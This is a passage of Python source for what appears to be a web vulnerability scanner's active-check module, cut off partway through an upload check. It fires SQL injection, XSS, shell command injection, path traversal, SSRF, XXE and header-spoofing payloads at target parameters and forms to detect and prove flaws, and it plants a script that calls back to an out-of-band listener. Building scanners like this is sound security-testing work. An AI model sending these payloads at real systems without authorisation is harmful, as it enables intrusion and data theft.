"""Deep active checks. Every High/Critical ships extracted proof, Acunetix-style."""
import base64
import difflib
import hashlib
import hmac as hmac_mod
import json
import re
import threading
import time
import urllib.parse
import uuid

from .core import params_of, parse_page, with_param
from .calibrate import median_time, similarity as _nsim
from .calibrate import waf_blocked as _waf_blocked

MARK = "wSc9"           # short reflection marker
TIME_DELAY = 4          # seconds for time-based probes

# ------------------------------------------------------------------ helpers

SQL_ERROR_RES = [re.compile(p, re.I) for p in [
    r"you have an error in your sql syntax", r"warning: mysql",
    r"unclosed quotation mark", r"quoted string not properly terminated",
    r"ora-\d{5}", r"postgres(?:ql)?\serror", r"pg_query\(\)",
    r"sqlite3?[._ ]?(?:operational)?error", r"sqlite_error",
    r"microsoft ole db provider for sql server", r"odbc sql server driver",
    r"syntax error at or near", r"mysql_fetch", r"valid mysql result",
    r"com\.mysql\.jdbc", r"org\.postgresql", r"sqlite\.exception",
]]

URLISH_NAMES = {"url", "uri", "link", "src", "dest", "destination", "target",
                "redirect", "next", "fetch", "load", "path", "file", "page",
                "img", "image", "callback", "endpoint", "host", "feed"}


DBMS_ERROR_MAP = [
    (re.compile(r"you have an error in your sql syntax|warning: mysql|"
                r"mysql_fetch|valid mysql result|com\.mysql\.jdbc", re.I), "MySQL"),
    (re.compile(r"postgres(?:ql)?\serror|pg_query\(\)|syntax error at or "
                r"near|org\.postgresql", re.I), "PostgreSQL"),
    (re.compile(r"sqlite3?[._ ]?(?:operational)?error|sqlite_error|"
                r"sqlite\.exception|unrecognized token", re.I), "SQLite"),
    (re.compile(r"unclosed quotation mark|microsoft ole db provider for sql "
                r"server|odbc sql server driver", re.I), "MSSQL"),
    (re.compile(r"ora-\d{5}|quoted string not properly terminated", re.I), "Oracle"),
]


def _dbms_of(body):
    for rx, name in DBMS_ERROR_MAP:
        if rx.search(body or ""):
            return name
    return ""


def _sim(ctx, a, b):
    """Similarity via the calibrated normalizer when available."""
    if getattr(ctx, "calibrator", None) is not None:
        return _nsim(a, b)
    return _similar(a, b)


def _timed_stats(ctx, url):
    """Per-URL timing stats, cached on the context: (median, jitter).
    Thresholds elsewhere use max(0.6*delay, 4*jitter) so a naturally
    jumpy endpoint needs a bigger deviation to be called a hit."""
    cache = getattr(ctx, "_time_stats", None)
    if cache is None:
        ctx._time_stats = cache = {}
    if url in cache:
        return cache[url]
    samples = []
    for _ in range(5):
        r = ctx.client.fetch(url)
        if r.elapsed:
            samples.append(r.elapsed)
    samples.sort()
    med = samples[len(samples) // 2] if samples else 0.3
    mad = sorted(abs(s - med) for s in samples)[len(samples) // 2] \
        if samples else 0.05
    cache[url] = (med, max(mad, 0.03))
    return cache[url]


def _timed_median(client, url, n=3):
    ts = []
    for _ in range(n):
        r = client.fetch(url)
        if r.status is not None:
            ts.append(r.elapsed)
    return median_time(ts)


def _sql_error_in(body):
    for r in SQL_ERROR_RES:
        m = r.search(body or "")
        if m:
            return m.group(0)
    return ""


def _similar(a, b):
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:8000], b[:8000]).ratio()


# ------------------------------------------------------------------ SQLi

def sqli_url(ctx, url):
    client, F = ctx.client, ctx.findings
    for name, orig in params_of(url):
        # 1) error-based (also fingerprints the DBMS for later stages)
        hit = None
        dbms = ""
        for probe in ("'", '"', "')", "'-- -", "1'"):
            r = client.fetch(with_param(url, name, orig + probe))
            err = _sql_error_in(r.body)
            if r.status and err:
                hit = (r, err)
                dbms = _dbms_of(r.body)
                break
            if not dbms:
                dbms = _dbms_of(r.body)
        if hit:
            r, err = hit
            F.add("High", "SQL Injection (error-based)", url,
                  f"Parameter '{name}' breaks out of the SQL query; the database "
                  f"error is reflected in the response.",
                  proof=f"DB error in response: {err}"
                        + (f" | DBMS fingerprinted: {dbms}" if dbms else ""),
                  param=name, resp=r, cwe="CWE-89", payload=orig + probe)
            continue
        # 2) UNION marker extraction — the marker is built by SQL string
        # concatenation ('WSUN'||'ION9' / CONCAT), so the literal marker
        # never appears in the request: a page that merely REFLECTS the
        # payload cannot fake database execution.
        union_done = False
        for quote in ("'", ""):
            if union_done:
                break
            for cols in (1, 2, 3, 4, 5, 6, 8):
                for expr in ("'WSUN'||'ION9'", "CONCAT('WSUN','ION9')",
                             "'WSUN'+'ION9'"):
                    union = " UNION SELECT " + ",".join(
                        [expr] + ["NULL"] * (cols - 1)) + "-- -"
                    r = client.fetch(with_param(url, name,
                                                orig + quote + union))
                    if r.status and "WSUNION9" in (r.body or ""):
                        F.add("High", "SQL Injection (UNION-based)", url,
                              f"Parameter '{name}' allows UNION SELECT with "
                              f"{cols} column(s); the injected marker was "
                              f"assembled by the database (string "
                              f"concatenation), proving execution.",
                              proof="Marker WSUNION9 (SQL-concatenated) "
                                    "returned in response body",
                              param=name, resp=r, cwe="CWE-89",
                              payload=orig + quote + union)
                        union_done = True
                        break
                if union_done:
                    break
        if union_done:
            continue

        # 3) boolean-based differential
        base = client.fetch(url)
        waf_hit = [False]

        def _bool_pair(p_true, p_false):
            tt = client.fetch(with_param(url, name, p_true))
            ff = client.fetch(with_param(url, name, p_false))
            if _waf_blocked(tt) or _waf_blocked(ff):
                waf_hit[0] = True
            return tt, ff

        # context families: plain string, comment-terminated string
        # (survives LIKE '%..%' templates), and numeric (no quotes)
        bool_families = [
            (f"{orig}' AND '1'='1", f"{orig}' AND '1'='2"),
            (f"{orig}' AND '1'='1'-- -", f"{orig}' AND '1'='2'-- -"),
            (f"{orig} AND 1=1", f"{orig} AND 1=2"),
        ]
        t = f_ = None
        variant_note = ""
        for pt, pf in bool_families:
            t, f_ = _bool_pair(pt, pf)
            if t.body and f_.body:
                # contrast rule: TRUE tracks the baseline while FALSE
                # diverges from TRUE (robust on small pages where a
                # one-word difference never reaches fixed thresholds)
                _st = _sim(ctx, base.body, t.body)
                _sf = _sim(ctx, base.body, f_.body)
                _stf = _sim(ctx, t.body, f_.body)
                if (_st > 0.95 and _sf < 0.80) or \
                        (_st > 0.90 and _stf < 0.95 and _st - _stf > 0.03):
                    break  # differential found in this context
                t = f_ = None
        if waf_hit[0] and t is None:
            # WAF is eating the classic payloads — try evasion variants
            t, f_ = _bool_pair(f"{orig}'/**/aNd/**/'1'='1",
                               f"{orig}'/**/aNd/**/'1'='2")
            variant_note = " (via WAF-evasion variant)"
        if base.body and t is not None and t.body and f_.body:
            st = _sim(ctx, base.body, t.body)
            sf = _sim(ctx, base.body, f_.body)
            stf = _sim(ctx, t.body, f_.body)
            if (st > 0.95 and sf < 0.80) or \
                    (st > 0.90 and stf < 0.95 and st - stf > 0.03):
                F.add("High", "SQL Injection (boolean-based blind)", url,
                      f"Parameter '{name}' is interpreted as SQL: TRUE condition "
                      f"matches the baseline ({st:.0%} similar), FALSE diverges "
                      f"({sf:.0%}). Data can be extracted bit by bit.",
                      proof=f"similarity base/TRUE={st:.2f} "
                            f"base/FALSE={sf:.2f} TRUE/FALSE={stf:.2f}"
                            f"{variant_note}",
                      param=name, resp=t, cwe="CWE-89",
                      payload=(pt if not variant_note
                               else f"{orig}'/**/aNd/**/'1'='1"))
                continue
        # 4) time-based blind — DBMS-targeted, statistically confirmed:
        # median baseline (3 samples), 2 attack samples must both clear
        # baseline + 70% of the delay, and a control request must not.
        _D = TIME_DELAY
        _nums = " UNION ALL ".join(f"SELECT {i} AS x" for i in range(1, 19))
        _sqlite_heavy = (
            f"{orig}' AND (SELECT SUM(length(hex(randomblob(50000)))) "
            f"FROM ({_nums}) a, ({_nums}) b, ({_nums}) c) > 0-- -")
        # (payload, expected delay seconds) — SQLite has no sleep(), so it
        # gets a generated heavy query with a shorter expectation. Each
        # family carries a string-context and a numeric-context form.
        _sqlite_heavy_num = (
            f"{orig} AND (SELECT SUM(length(hex(randomblob(50000)))) "
            f"FROM ({_nums}) a, ({_nums}) b, ({_nums}) c) > 0")
        time_payloads = {
            "MySQL": [(f"{orig}' AND SLEEP({_D})-- -", _D),
                      (f"{orig} AND SLEEP({_D})", _D),
                      (f"{orig}' AND (SELECT 1 FROM (SELECT SLEEP({_D}))x)-- -",
                       _D)],
            "PostgreSQL": [(f"{orig}'; SELECT pg_sleep({_D})-- -", _D),
                           (f"{orig} AND (SELECT pg_sleep({_D})) IS NULL", _D)],
            "MSSQL": [(f"{orig}'; WAITFOR DELAY '0:0:{_D}'-- -", _D)],
            "SQLite": [(_sqlite_heavy, 2.0), (_sqlite_heavy_num, 2.0)],
            "Oracle": [(f"{orig}' AND DBMS_PIPE.RECEIVE_MESSAGE('w',"
                        f"{_D})=1-- -", _D)],
        }
        families = [dbms] if dbms in time_payloads else \
            ["MySQL", "PostgreSQL", "MSSQL", "SQLite"]
        baseline, _jit = _timed_stats(ctx, url)
        _tfloor = max(1.2, min(4 * _jit, 1.0))
        ctrl = client.fetch(url)
        if ctrl.elapsed < baseline + _tfloor:  # stable enough to judge
            done_time = False
            for fam in families:
                if done_time:
                    break
                for payload, delay in time_payloads.get(fam, []):
                    s1 = client.fetch(with_param(url, name, payload))
                    if s1.status is None or s1.elapsed <= baseline + max(0.6 * delay, min(4 * _jit, 0.45 * delay)):
                        continue
                    s2 = client.fetch(with_param(url, name, payload))
                    if s2.elapsed > baseline + max(0.6 * delay, min(4 * _jit, 0.45 * delay)):
                        F.add("High", "SQL Injection (time-based blind)", url,
                              f"Parameter '{name}' delays the response by "
                              f"~{delay:.0f}s on demand ({fam} primitive). Median "
                              f"baseline {baseline:.2f}s; both attack samples "
                              f"exceeded baseline + 70% of the delay while a "
                              f"control request did not.",
                              proof=f"baseline(median)={baseline:.2f}s "
                                    f"control={ctrl.elapsed:.2f}s "
                                    f"injected={s1.elapsed:.2f}s,"
                                    f"{s2.elapsed:.2f}s",
                              param=name, resp=s1, cwe="CWE-89",
                              payload=payload)
                        done_time = True
                        break
        if waf_hit[0]:
            F.add("Info", "WAF Interference (coverage limited)", url,
                  "A web application firewall blocked the standard attack "
                  "payloads for at least one parameter; evasion variants "
                  "were attempted. A 'clean' result here means 'blocked', "
                  "not necessarily 'not vulnerable'.",
                  param=name, dedupe_key=("wafblock", url), cwe="CWE-693")
# ------------------------------------------------------------------ XSS

XSS_PAYLOADS = [
    f'"><svg onload=alert("{MARK}")>',
    f"'<script>alert('{MARK}')</script>",
    f'"><img src=x onerror=alert("{MARK}")>',
    f"<svg/onload=alert('{MARK}')>",
]


XSS_CONFIRM_PAYLOAD = '\'"><svg onload=alert("wSc8")>'
XSS_WAF_VARIANTS = [
    '"><sVg OnLoAd=alert("wSc9")>',
    '"><svg\tonload=alert("wSc9")>',
    "%22%3E%3Csvg%20onload%3Dalert(%22wSc9%22)%3E",
    '"><svg/onload=alert("wSc9")>',
]


def xss_url(ctx, url):
    client, F = ctx.client, ctx.findings
    payloads = XSS_PAYLOADS + list(getattr(ctx, "extra", {}).get("xss", []))
    for name, _v in params_of(url):
        hit = None
        for payload in payloads:
            r = client.fetch(with_param(url, name, payload))
            if _waf_blocked(r):
                for variant in XSS_WAF_VARIANTS:
                    rv = client.fetch(with_param(url, name, variant))
                    if rv.status and variant in rv.body:
                        hit = (rv, variant, " (WAF-evasion variant)")
                        break
                if hit:
                    break
                continue
            if r.status and payload in r.body:
                hit = (r, payload, "")
                break
        if hit:
            r, payload, vnote = hit
            # reproducibility: a second, different payload must also reflect
            r2 = client.fetch(with_param(url, name, XSS_CONFIRM_PAYLOAD))
            verified = bool(r2.status and XSS_CONFIRM_PAYLOAD in r2.body)
            F.add("High", "Cross-Site Scripting (reflected)", url,
                  f"Parameter '{name}' reflects the payload into the HTML "
                  f"without encoding; it executes in a victim's browser."
                  + ("" if verified else
                     " NOTE: a second confirmation payload did not reflect — "
                     "single observation, treat as tentative."),
                  proof=f"Unescaped payload in response: {payload}{vnote}"
                        + (" | confirmed with a second payload" if verified
                           else ""),
                  param=name, resp=r, cwe="CWE-79", payload=payload,
                  confidence="Confirmed" if verified else "Tentative")


# ------------------------------------------------------------------ command injection

def cmdi_url(ctx, url):
    client, F = ctx.client, ctx.findings
    # The payload makes the shell COMPUTE the marker (7000+391) so the output
    # string never appears in the input — a reflected input (e.g. inside a
    # DB error message) can therefore never fake execution.
    expr = "WSC$((7000+391))Z"
    token = "WSC7391Z"
    for name, orig in params_of(url):
        for tpl in (";echo {t}", "|echo {t}", "$(echo {t})", "`echo {t}`",
                    "&echo {t}", "||echo {t}"):
            value = orig + tpl.format(t=expr)
            r = client.fetch(with_param(url, name, value))
            if r.status and token in r.body and value not in r.body:
                F.add("Critical", "OS Command Injection", url,
                      f"Parameter '{name}' is passed to a system shell; the echo "
                      f"marker was executed and returned.",
                      proof=f"Marker {token} in response", param=name,
                      resp=r, cwe="CWE-78", payload=value)
                return
        # Windows family: cmd.exe has no $((..)) arithmetic — read a file
        # whose CONTENT marker can never appear in a reflected input.
        for tpl in ("& type C:\\Windows\\win.ini",
                    "| type C:\\Windows\\win.ini"):
            r = client.fetch(with_param(url, name, orig + tpl))
            if r.status and "[fonts]" in (r.body or ""):
                F.add("Critical", "OS Command Injection", url,
                      f"Parameter '{name}' is passed to a Windows shell; "
                      f"an injected `type` command returned win.ini "
                      f"contents.",
                      proof="[fonts] section of win.ini in response",
                      param=name, resp=r, cwe="CWE-78", payload=orig + tpl)
                return
        # time-based — statistical: median baseline, a control request
        # that must stay fast, and two attack samples that must both delay
        baseline, _jit = _timed_stats(ctx, url)
        _tthr = baseline + max(0.7 * TIME_DELAY,
                               min(4 * _jit, 0.45 * TIME_DELAY))
        ctrl = client.fetch(url)
        if ctrl.elapsed >= _tthr:
            continue  # target too jittery to judge timing on this param
        for tpl in (f";sleep {TIME_DELAY}", f"| sleep {TIME_DELAY}",
                    f"$(sleep {TIME_DELAY})",
                    f"& ping -n {TIME_DELAY + 1} 127.0.0.1 >nul",
                    f"& timeout /t {TIME_DELAY} /nobreak >nul"):
            r = client.fetch(with_param(url, name, orig + tpl))
            if r.status is not None and r.elapsed > _tthr:
                r2 = client.fetch(with_param(url, name, orig + tpl))
                if r2.elapsed > _tthr:
                    F.add("Critical", "OS Command Injection (time-based)", url,
                          f"Parameter '{name}' delays the response by "
                          f"~{TIME_DELAY}s via a shell sleep. Median baseline "
                          f"{baseline:.2f}s, control {ctrl.elapsed:.2f}s, both "
                          f"attack samples exceeded baseline + 70% of the delay.",
                          proof=f"baseline(median)={baseline:.2f}s "
                                f"control={ctrl.elapsed:.2f}s "
                                f"injected={r.elapsed:.2f}s,{r2.elapsed:.2f}s",
                          param=name, resp=r, cwe="CWE-78",
                          payload=orig + tpl)
                    return


# ------------------------------------------------------------------ SSTI

def ssti_url(ctx, url):
    client, F = ctx.client, ctx.findings
    a, b = 7331, 7
    expect = str(a * b)
    probes = [("{{" + f"{a}*{b}" + "}}", "Jinja2/Twig/Nunjucks"),
              ("${" + f"{a}*{b}" + "}", "FreeMarker/EL"),
              ("#{" + f"{a}*{b}" + "}", "Ruby/ERB-style"),
              ("<%=" + f" {a}*{b} " + "%>", "ERB/EJS"),
              ("{{" + f"{a}*{b}" + "}}", "Twig")]
    for name, orig in params_of(url):
        for payload, engine in probes:
            r = client.fetch(with_param(url, name, orig + payload))
            if r.status and expect in r.body and payload not in r.body:
                F.add("Critical", "Server-Side Template Injection", url,
                      f"Parameter '{name}' is evaluated by a template engine "
                      f"({engine}): {a}*{b} was computed server-side to {expect}. "
                      f"SSTI typically escalates to RCE.",
                      proof=f"{payload} -> {expect} in response", param=name,
                      resp=r, cwe="CWE-1336", payload=orig + payload)
                return


# ------------------------------------------------------------------ LFI / traversal

def lfi_url(ctx, url):
    client, F = ctx.client, ctx.findings
    probes = ["../../../etc/passwd", "../../../../etc/passwd",
              "../../../../../etc/passwd", "....//....//....//etc/passwd",
              "..%2f..%2f..%2f..%2fetc%2fpasswd",
              "..\\..\\..\\windows\\win.ini",
              "..\\..\\..\\..\\windows\\win.ini",
              "..\\..\\..\\..\\..\\windows\\win.ini",
              "C:\\windows\\win.ini", "C:\\winnt\\win.ini",
              "php://filter/convert.base64-encode/resource=index.php",
              "/etc/passwd"]
    for name, orig in params_of(url):
        for probe in probes:
            r = client.fetch(with_param(url, name, probe))
            if not r.status:
                continue
            if re.search(r"root:.*:0:0:", r.body):
                F.add("Critical", "Local File Inclusion / Path Traversal", url,
                      f"Parameter '{name}' reads arbitrary files outside the web "
                      f"root; /etc/passwd contents were returned.",
                      proof=r.body[r.body.find("root:"):r.body.find("root:") + 120],
                      param=name, resp=r, cwe="CWE-22", payload=probe)
                return
            if "for 16-bit app support" in r.body or "[fonts]" in r.body:
                F.add("Critical", "Local File Inclusion / Path Traversal", url,
                      f"Parameter '{name}' read C:\\windows\\win.ini.",
                      proof="[fonts] section of win.ini in response",
                      param=name, resp=r, cwe="CWE-22", payload=probe)
                return
            if "php://filter" in probe and r.status == 200:
                m = re.search(r"[A-Za-z0-9+/=]{60,}", r.body)
                if m:
                    try:
                        dec = base64.b64decode(m.group(0)).decode(errors="replace")
                        if "<?php" in dec:
                            F.add("High", "Local File Inclusion (php://filter)", url,
                                  f"Parameter '{name}' exposes PHP source via the "
                                  f"php://filter wrapper.",
                                  proof=dec[:200], param=name, resp=r, cwe="CWE-22",
                                  payload=probe)
                            return
                    except Exception:
                        pass


# ------------------------------------------------------------------ open redirect / CRLF / CORS

REDIRECT_NAMES = {"url", "next", "redirect", "return", "returnurl", "dest",
                  "destination", "target", "goto", "link", "continue"}


def redirect_url(ctx, url):
    client, F = ctx.client, ctx.findings
    for name, val in params_of(url):
        if name.lower() in REDIRECT_NAMES or val.startswith(("http://", "https://", "//")):
            r = client.fetch(with_param(url, name, "https://example.org/wscan-probe"))
            loc = r.header("location")
            if r.status in (301, 302, 303, 307, 308) and "example.org" in loc:
                F.add("Medium", "Open Redirect", url,
                      f"Parameter '{name}' redirects the browser to an arbitrary "
                      f"external URL — usable for phishing/token theft.",
                      proof=f"Location: {loc}", param=name, resp=r, cwe="CWE-601",
                      payload="https://example.org/wscan-probe")
                return


def crlf_url(ctx, url):
    client, F = ctx.client, ctx.findings
    for name, orig in params_of(url):
        probe = orig + "\r\nX-WScan-Injected: crlf"
        r = client.fetch(with_param(url, name, probe))
        if r.header("x-wscan-injected") == "crlf":
            F.add("Medium", "CRLF Injection / HTTP Response Splitting", url,
                  f"Parameter '{name}' injects arbitrary response headers "
                  f"(CR/LF not sanitized).",
                  proof="Response contains injected header 'X-WScan-Injected: crlf'",
                  param=name, resp=r, cwe="CWE-113", payload=probe)
            return


def cors_check(ctx, url):
    client, F = ctx.client, ctx.findings
    origin = "https://evil.attacker.example"
    r = client.fetch(url, headers={"Origin": origin})
    acao = r.header("access-control-allow-origin")
    acac = r.header("access-control-allow-credentials")
    if acao == origin:
        sev = "High" if acac.lower() == "true" else "Medium"
        F.add(sev, "Cross-Origin Resource Sharing (CORS) Misconfiguration", url,
              f"The server reflects ANY Origin with "
              f"Access-Control-Allow-Origin: {origin}"
              + (" and allows credentials — any website can read authenticated "
                 "responses." if sev == "High" else "."),
              proof=f"ACAO reflects {origin}; ACAC={acac or 'absent'}",
              resp=r, cwe="CWE-942", dedupe_key=("cors",))
    elif acao == "*" and acac.lower() == "true":
        F.add("Medium", "Cross-Origin Resource Sharing (CORS) Misconfiguration", url,
              "Wildcard origin combined with credentials.",
              proof="ACAO: * with ACAC: true", resp=r, cwe="CWE-942")


# ------------------------------------------------------------------ SSRF (OOB)

def ssrf_url(ctx, url):
    """Point URL-ish params at the OOB listener and at the cloud metadata IP.
    OOB hits are resolved in finalize_oob()."""
    client, F = ctx.client, ctx.findings
    for name, orig in params_of(url):
        if name.lower() not in URLISH_NAMES and not orig.startswith(("http://", "https://")):
            continue
        token = ctx.oob.new_token()
        probe_url = ctx.oob.url(token)
        r = client.fetch(with_param(url, name, probe_url))
        ctx.oob_pending.append({
            "token": token, "kind": "SSRF", "url": url, "param": name, "resp": r,
            "payload": probe_url})
        # direct metadata probe (in-band proof if the app echoes the fetch)
        meta = client.fetch(with_param(
            url, name, "http://169.254.169.254/latest/meta-data/"))
        if meta.status and re.search(r"(ami-id|instance-id|iam|security-credentials)",
                                     meta.body or ""):
            F.add("Critical", "Server-Side Request Forgery (cloud metadata)", url,
                  f"Parameter '{name}' made the server fetch the EC2 metadata "
                  f"service and the response was returned.",
                  proof=meta.body[:200], param=name, resp=meta, cwe="CWE-918",
                  payload="http://169.254.169.254/latest/meta-data/")


def finalize_oob(ctx):
    """After a short wait, turn recorded OOB callbacks into findings."""
    seen_tokens = set()
    for pend in ctx.oob_pending:
        token = pend["token"]
        if token in seen_tokens:
            continue
        hits = ctx.oob.get_hits(token)
        if not hits:
            continue
        seen_tokens.add(token)
        hit = hits[0]
        proof = (f"Target server called back: {hit['method']} {hit['path']} "
                 f"at {hit['time']} (User-Agent: "
                 f"{hit['headers'].get('User-Agent', '?')})")
        if pend["kind"] == "SSRF":
            ctx.findings.add(
                "Critical", "Server-Side Request Forgery (out-of-band confirmed)",
                pend["url"],
                f"Parameter '{pend['param']}' made the server issue an HTTP "
                f"request to an attacker-controlled URL. Internal services and "
                f"cloud metadata are reachable from here.",
                proof=proof, param=pend["param"], resp=pend["resp"], cwe="CWE-918",
                payload=pend.get("payload", ""))
        elif pend["kind"] == "XXE":
            ctx.findings.add(
                "High", "XML External Entity (blind, out-of-band confirmed)",
                pend["url"],
                "The XML parser resolved an external entity pointing at an "
                "attacker-controlled server (callback received).",
                proof=proof, param=pend["param"], resp=pend["resp"], cwe="CWE-611",
                payload=pend.get("payload", ""))
        elif pend["kind"] == "BlindXSS":
            ctx.findings.add(
                "High", "Blind Cross-Site Scripting (out-of-band confirmed)",
                pend["url"],
                "A stored payload executed in a browser that then called the "
                "OOB listener — classic admin-panel blind XSS.",
                proof=proof, param=pend["param"], resp=pend["resp"], cwe="CWE-79",
                payload=pend.get("payload", ""))


# ------------------------------------------------------------------ XXE

XXE_TMPL = """<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "{target}"> ]>
<root><v>&xxe;</v></root>"""


def xxe_check(ctx, urls, forms=None):
    client, F = ctx.client, ctx.findings
    # Only probe plausible XML consumers: the site root, form actions, and
    # API/XML-ish paths — POSTing XML at every page creates noise.
    candidates = set()
    parts = urllib.parse.urlsplit(ctx.base)
    root = f"{parts.scheme}://{parts.netloc}"
    candidates.add(root + "/")
    for page_url, form in (forms or []):
        candidates.add(urllib.parse.urljoin(page_url,
                                            form["action"] or page_url).split("?")[0].rstrip("/"))
    for u in urls:
        clean = u.split("?")[0].rstrip("/")
        if any(k in clean.lower() for k in ("api", "xml", "soap", "wsdl", "service", "graphql")):
            candidates.add(clean)
    candidates.discard(root)
    targets = sorted(candidates)[:5]
    for endpoint in targets:
        # in-band file read
        payload = XXE_TMPL.format(target="file:///etc/passwd")
        r = client.fetch(endpoint, method="POST", raw_body=payload.encode(),
                         content_type="application/xml")
        if r.status and re.search(r"root:.*:0:0:", r.body or ""):
            F.add("Critical", "XML External Entity (XXE) Injection", endpoint,
                  "The XML parser resolves external entities; /etc/passwd was "
                  "read and returned.",
                  proof=r.body[r.body.find("root:"):r.body.find("root:") + 120],
                  param="(XML body)", resp=r, cwe="CWE-611", payload=payload)
            continue
        # blind OOB
        token = ctx.oob.new_token()
        payload = XXE_TMPL.format(target=ctx.oob.url(token))
        r = client.fetch(endpoint, method="POST", raw_body=payload.encode(),
                         content_type="application/xml")
        ctx.oob_pending.append({"token": token, "kind": "XXE",
                                "url": endpoint, "param": "(xml body)", "resp": r,
                                "payload": payload})


# ------------------------------------------------------------------ host header

def host_header_check(ctx, base):
    client, F = ctx.client, ctx.findings
    evil = "wscan-evil.example"
    r = client.fetch(base, headers={"Host": evil,
                                    "X-Forwarded-Host": evil})
    if r.status and evil in (r.body or ""):
        F.add("Medium", "Host Header Injection", base,
              "The application builds absolute URLs from the unvalidated Host "
              "header — password-reset poisoning / cache poisoning vector.",
              proof=f"Injected host '{evil}' reflected in response body",
              resp=r, cwe="CWE-644", payload=evil)


# ------------------------------------------------------------------ forms

def smart_value(name, itype):
    """Type-appropriate plausible value: passes server-side validation so
    submissions reach deep code paths instead of bouncing off validators."""
    n = (name or "").lower()
    if itype == "email" or "email" in n or n == "mail":
        return "reconix.tester@example.com"
    if itype == "date" or "dob" in n or "birth" in n or "date" in n:
        return "2000-01-15"
    if itype == "tel" or "phone" in n or "mobile" in n or n == "tel":
        return "+919876543210"
    if "zip" in n or "postal" in n or "pincode" in n or "pin_code" in n:
        return "110001"
    if "otp" in n or "code" in n:
        return "123456"
    if itype == "password" or "pass" in n:
        return "Str0ng!Pass1"
    if itype == "url" or "website" in n or n == "url":
        return "https://example.com"
    if itype == "number" or "age" in n:
        return "30"
    if "amount" in n or "price" in n:
        return "100"
    if "qty" in n or "quantity" in n or "count" in n:
        return "2"
    if "user" in n:
        return "webscan_user"
    if "name" in n:
        return "Reconix Tester"
    if "comment" in n or "message" in n or "desc" in n or "bio" in n:
        return "Hello, this is a test message."
    if itype == "search" or n in ("q", "query", "search", "keyword"):
        return "test"
    return "test"


def _form_fields(form, override=None):
    data = {}
    for i in form["inputs"]:
        if i["type"] in ("submit", "button", "file"):
            continue
        data[i["name"]] = i["value"] or smart_value(i["name"], i["type"])
    if override:
        data.update(override)
    return data


def _submit_form(client, page_url, form, data):
    action = urllib.parse.urljoin(page_url, form["action"] or page_url)
    if form["method"] == "POST":
        return action, client.fetch(action, method="POST", data=data)
    q = urllib.parse.urlencode(data)
    sep = "&" if "?" in action else "?"
    return action, client.fetch(f"{action}{sep}{q}")


def forms_check(ctx, page_url, form, all_page_urls):
    client, F = ctx.client, ctx.findings
    text_fields = [i["name"] for i in form["inputs"]
                   if i["type"] not in ("submit", "button", "file", "hidden",
                                        "checkbox", "radio")]
    if not text_fields:
        return
    stored_marker = f"{MARK}stored7391"
    for fname in text_fields:
        # unique per field so one form's stored payload can't be attributed
        # to another form that merely views the same page
        stored_marker = f"{MARK}st{uuid.uuid4().hex[:8]}"
        # reflected / error checks
        for payload in XSS_PAYLOADS:
            action, r = _submit_form(client, page_url, form,
                                     _form_fields(form, {fname: payload}))
            if r.status and payload in (r.body or ""):
                F.add("High", "Cross-Site Scripting (reflected, form)", action,
                      f"Form field '{fname}' on {page_url} reflects the payload "
                      f"unescaped.", proof=f"Payload reflected: {payload}",
                      param=fname, resp=r, cwe="CWE-79", payload=payload)
                break
        action, r = _submit_form(client, page_url, form,
                                 _form_fields(form, {fname: "test'"}))
        err = _sql_error_in(r.body)
        if r.status and err:
            F.add("High", "SQL Injection (form, error-based)", action,
                  f"Form field '{fname}' on {page_url} triggers a database error.",
                  proof=f"DB error: {err}", param=fname, resp=r, cwe="CWE-89",
                  payload="test'")
        # stored XSS: submit a payload w/ fetch beacon + marker,
        # then look for the unescaped marker on every known page.
        token = ctx.oob.new_token()
        beacon = (f"<script>fetch('{ctx.oob.url(token)}')"
                  f"</script>{stored_marker}")
        action, r = _submit_form(client, page_url, form,
                                 _form_fields(form, {fname: beacon}))
        ctx.oob_pending.append({"token": token, "kind": "BlindXSS",
                                "url": action, "param": fname, "resp": r,
                                "payload": beacon})
        for u in all_page_urls:
            rr = client.fetch(u)
            if rr.status and stored_marker in (rr.body or "") \
                    and "<script" in (rr.body or "").lower():
                F.add("High", "Cross-Site Scripting (stored)", u,
                      f"Payload submitted via form field '{fname}' on {page_url} "
                      f"persists and is served unescaped on {u}. The request "
                      f"shown is the submission that planted it.",
                      proof=f"Stored marker {stored_marker} present unescaped on {u}",
                      param=fname, resp=r, cwe="CWE-79", payload=beacon)
                break
        # second-order SQLi: plant a quote, then hunt for a NEW SQL
        # error on pages that were clean during the crawl — the stored
        # value is being embedded in a query somewhere else.
        if fname == text_fields[0]:
            # serialize across concurrent form workers, and probe once
            # per scan: parallel plants would attribute each other's
            # stored values to the wrong form
            _so_lock = getattr(ctx, "_so_lock", None)
            if _so_lock is None:
                ctx._so_lock = _so_lock = threading.Lock()
            with _so_lock:
                if not getattr(ctx, "_so_done", False):
                    _submit_form(client, page_url, form, _form_fields(
                        form, {fname: "wscan2ndok"}))
                    _pre = set()
                    for u in all_page_urls:
                        rr0 = client.fetch(u)
                        if rr0.status and _sql_error_in(rr0.body):
                            _pre.add(u)
                    _submit_form(client, page_url, form, _form_fields(
                        form, {fname: "wscan2nd'"}))
                    for u in all_page_urls:
                        if u in _pre or u in getattr(
                                ctx, "baseline_error_urls", set()):
                            continue
                        rr = client.fetch(u)
                        err = _sql_error_in(rr.body)
                        if rr.status and err:
                            F.add(
                                "High", "Second-Order SQL Injection", u,
                                f"A value planted via form field "
                                f"'{fname}' on {page_url} later triggers "
                                f"a database error on {u} — the stored "
                                f"value reaches a SQL query unsafely "
                                f"(second-order injection).",
                                proof=f"DB error after plant: {err}",
                                param=fname, resp=rr, cwe="CWE-89",
                                payload="wscan2nd'")
                            ctx._so_done = True
                            break
                    # leave the app as we found it
                    _submit_form(client, page_url, form, _form_fields(
                        form, {fname: "wscan2ndok"}))


# ------------------------------------------------------------------ file upload

def upload_check(ctx, page_url, form):
    client, F = ctx.client, ctx.findings
    file_fields = [i["name"] for i in form["inputs"] if i["type"] == "file"]
    if not file_fields:
        return
    action = urllib.parse.urljoin(page_url, form["action"] or page_url)
    marker = "WSUPLOAD7391"
    plain_fields = _form_fields(form)
    for ff in file_fields:
        # 1) plain text upload — is it web-accessible afterwards?
        fname = f"wscan_{marker}.txt"
        r = client.fetch_multipart(action, plain_fields,
                                   {ff: (fname, marker, "text/plain")})
        found = _locate_upload(ctx, action, fname, marker)
        if found:
            F.add("Medium", "File Upload — unrestricted file stored web-accessible",
                  found,
                  "An uploaded text file can be retrieved over HTTP. If script "
                  "types are also accepted this becomes RCE.",
                  proof=f"GET {found} returned the marker {marker}",
